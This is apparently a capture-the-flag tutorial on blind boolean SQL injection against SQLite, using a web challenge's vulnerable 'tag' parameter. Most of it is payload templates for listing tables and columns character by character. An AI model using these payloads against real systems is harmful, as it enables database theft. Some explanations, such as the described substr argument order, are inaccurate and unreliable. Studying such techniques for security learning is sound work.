------------------

### Exploiting sqlite3

------------------

### Blind SQLite3 exfiltration

-----------------

- The method below is `Boolean based` which is `True` or `False` e.g If a statement is true, return this data and if false, do not return this query.
- This approach will be explained with `BYUCTF` `cooking flask` web challenge.The `tag` query is vulnerable-:

![image](https://github.com/user-attachments/assets/0f4fe54e-c1ed-4e87-a3d1-ccdfc717b127)

- Now let's move over to burp suite to understand the logic.If I send a statement `Italian%') and 1=1--+`,we get the data for `Italian` back because there is a column `Italian` and `1` is equals to `1` which is a true statement.You'll notice in the response tab that we got the data for `Italian`.

![image](https://github.com/user-attachments/assets/38f49ef1-6e3e-4f5a-8387-a4a32f74d597)

- Now, let us pass a false statement like `Italian%') and 1=2--+`, we didn't get any result.

![image](https://github.com/user-attachments/assets/d7610063-122a-4ba4-b85f-be22488c55c9)

- That's just the basis of Boolean based injection, if our statement is right,we'll get a positive result and if the statement is false, we'll get a negative result.

-----------------

### Counting the amount of tables

------------------

- The count() function in sql is used to count the amount of stuffs in a database. Digit will be placed after equals to `=`.`Count()` can count amount of rows,column and tables in a dataabase.

```sql
(SELECT count(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' ) = {number}
```

-------------------

### Tables length

--------------------

- Use the length() function,the code below is used to count the character length of table.I added `LIMIT` and `OFFSET` because we have to limit the table to a single one.If offset is set to `0` and limit is set to `1`, the first row will be read, to read the others, you just need to increment it.`Offset-:`1 and `limit` to 2.

```sql
(SELECT length(tbl_name) FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' LIMIT 1 OFFSET 0) = {number}
```

---------------------

### Reading the tables's characters

----------------------

- The functions `hex()` and `substr()` are useful in this scenario.You limit the rows and column with limit and offset and select the characters with `substr()`,the substr requires 3 arguments `(tbl_name,{characters'limit},{character's start})` which is hexed with `hex()` and checked if it is equal to a character that is hexed.The second argument of substr should be incremented only while the third argument is set to `1`.

```sqlite
(SELECT hex(substr(tbl_name,{character's end},{character's stop})) FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%' limit {i+1} offset {i}) = hex('{char}')--+"
```

-------------------

### Counting Columns-:

-------------------

- Query-:`count()`

```sqlite3
(SELECT count(name) FROM PRAGMA_TABLE_INFO('{table_name}'))={number}
```

-----------------------

### Column's length

-----------------------

- Query-:`length()`

```sqlite3
(SELECT+length(name)+FROM+PRAGMA_TABLE_INFO('{table_name}')+LIMIT+{end}+OFFSET+{start})={number}
```

------------------------

### Column's characters

------------------------

- Welp-:

```sqlite3
(select+case+substr(name,1,{digit+1})+WHEN+'{character}'+THEN+1+ELSE+1/0+END+FROM+PRAGMA_TABLE_INFO('{table_name}') LIMIT {i+1} OFFSET {i})
```
